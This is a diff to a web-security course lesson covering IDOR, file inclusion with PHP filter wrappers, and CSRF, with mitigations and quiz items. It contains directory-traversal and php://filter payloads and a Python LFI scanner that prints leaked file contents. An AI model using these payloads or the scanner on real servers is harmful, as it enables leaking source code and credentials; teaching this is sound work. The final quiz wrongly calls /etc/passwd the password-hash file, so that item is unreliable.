@@ -6,40 +6,122 @@ topic: "IDOR, File Inclusion, CSRF"
 difficulty: "Intermediate"
 ---
 
-# Day 10: Web Vulnerabilities II
+# Day 10: Web Vulnerabilities II - Logic, Access Control & PHP Filter Exploits
 
-Today we move beyond basic injections and look at how logic and access control break.
-
-## 1. IDOR (Insecure Direct Object Reference)
-- **Concept:** Changing a number in a URL to see someone else's data.
-- **Example:** You log in and see `shop.com/profile?id=100`. You change it to `id=101`. If you see *another* user's profile, that is **IDOR**.
-
-## 2. LFI/RFI (Local/Remote File Inclusion)
-- **Concept:** Tricking the website into showing you files from the server's own disk.
-- **Example:** `site.com/view?page=contact.php`. You change it to `page=/etc/passwd`.
-
-## 3. CSRF (Cross-Site Request Forgery)
-- **Concept:** Tricking a logged-in user into clicking a link that performs an action (like changing their password) without them knowing.
+Yesterday, we discussed input injection and client-side scripting. Today, we focus on access control design failures, application logic vulnerabilities, and advanced Local File Inclusion (LFI) via PHP wrappers.
 
 ---
 
-### Interactive Challenge 1: The IDOR Scout
-A hacker sees this URL: `https://bank.com/api/v1/transfer/9928`.
-What would they change `9928` to if they wanted to test for IDOR?
+## 1. IDOR (Insecure Direct Object Reference)
 
-<Challenge
-  id="day-10-idor"
-  type="input"
-  correctAnswer="9929"
-  placeholder="Enter a test ID..."
-/>
+**IDOR** occurs when an application exposes a reference to an internal database object or resource (such as a database ID or file path) in a URL or API parameter, without validating if the user is authorized to access it.
 
-### Interactive Challenge 2: The File Hunter
-To read the secret Linux user list via an LFI vulnerability, which file path is most commonly targeted?
+```
+Attacker logs in and sees their account URL:
+https://bank.com/api/v1/accounts/9928
+
+The attacker manually increments the ID value in their browser:
+https://bank.com/api/v1/accounts/9929
+```
+
+If the web server returns account data for `9929` without checking if the attacker owns that account, an IDOR vulnerability exists.
+
+### Mitigation: Object-Level Access Control
+Implement a centralized authorization check on the server side to verify that the logged-in user is authorized to access the specific requested object before returning it.
+
+---
+
+## 2. File Inclusion (LFI & RFI) & PHP Wrappers
+
+**File Inclusion** occurs when an application takes user input and passes it directly into a backend file system path loading function.
+
+### Local File Inclusion (LFI)
+The attacker reads local files on the server’s local disk by traversing directories using `../` (Directory Traversal):
+```
+https://site.com/view.php?page=../../../../etc/passwd
+```
+
+### Advanced LFI: PHP Filter Wrappers
+On PHP-based targets, if the server appends an extension (like `.php`) to your input, standard directory traversal might fail. To bypass this, we use **PHP Filters** to convert the target file to base64 encoding before it compiles on the server, allowing us to download raw backend source code:
+```
+https://site.com/view.php?page=php://filter/convert.base64-encode/resource=config
+```
+This returns the entire `config.php` code as a base64 string, leaking database keys, passwords, and API configurations!
+
+---
+
+## 3. CSRF (Cross-Site Request Forgery)
+
+**CSRF** is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently logged in.
+
+```
+1. Victim is logged into securebank.com.
+2. Victim visits a malicious website: hackerforum.com.
+3. hackerforum.com contains an invisible form that sends a post request to:
+   securebank.com/transfer?amount=10000&to=hacker
+4. The victim's browser automatically appends their secure session cookie.
+5. securebank.com executes the transfer, believing the victim performed the action!
+```
+
+### Mitigation: Anti-CSRF Tokens
+Use unique, unpredictable, and cryptographically secure **Anti-CSRF Tokens** associated with the user's active session. The server must validate this token before executing any state-changing request (such as bank transfers or password updates).
+
+---
+
+## 4. Field Portfolio Project: Local File Inclusion & Source Code Leakage Analyzer
+
+Let's build an automated security auditing script in Python that probes a web server endpoint for Local File Inclusion (LFI) vulnerabilities. It tests for directory traversal paths and automatically attempts to extract the system's root configurations.
+
+### Step 1: Create the Scanner Script
+Create a file named `lfi_analyzer.py`:
+```python
+import requests
+import sys
+
+def audit_lfi(target_url):
+    print(f"[*] Analyzing target for Local File Inclusion: {target_url}")
+
+    # Common system files to probe on Unix/Linux
+    payloads = [
+        "../../../../etc/passwd",
+        "../../../../../../../../etc/hosts",
+        "php://filter/convert.base64-encode/resource=index"
+    ]
+
+    for payload in payloads:
+        print(f"[*] Testing payload: {payload}")
+        # Send payload via page parameter
+        params = {"page": payload}
+        try:
+            r = requests.get(target_url, params=params)
+
+            # Check for signatures of successful inclusion
+            if "root:x:0:0" in r.text or "127.0.0.1" in r.text:
+                print(f"[!] EXPLOIT SUCCESS: Vulnerable to LFI with payload: {payload}")
+                print("[+] Exfiltrated File Contents:")
+                print(r.text[:500]) # Print first 500 characters
+                break
+            elif "php://" in payload and len(r.text) > 0 and r.status_code == 200:
+                print(f"[!] POTENTIAL BYPASS: Base64 Source Leakage payload succeeded: {payload}")
+                print(f"[+] Encoded Base64 string: {r.text[:100]}...")
+        except Exception as e:
+            print(f"[-] Request failed: {e}")
+
+if __name__ == "__main__":
+    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000/view"
+    audit_lfi(url)
+```
+
+This tool is incredibly useful for mapping server-side file inclusion risks during white-hat infrastructure audits!
+
+---
+
+### Challenge: LFI Target
+To read the secret Linux user password hash file via a Local File Inclusion (LFI) directory traversal exploit, which file path is most commonly targeted by attackers on Linux operating systems?
 
 <Challenge
   id="day-10-lfi"
   type="input"
   correctAnswer="/etc/passwd"
-  placeholder="/path/to/file"
+  placeholder="Enter targeted file path..."
 />
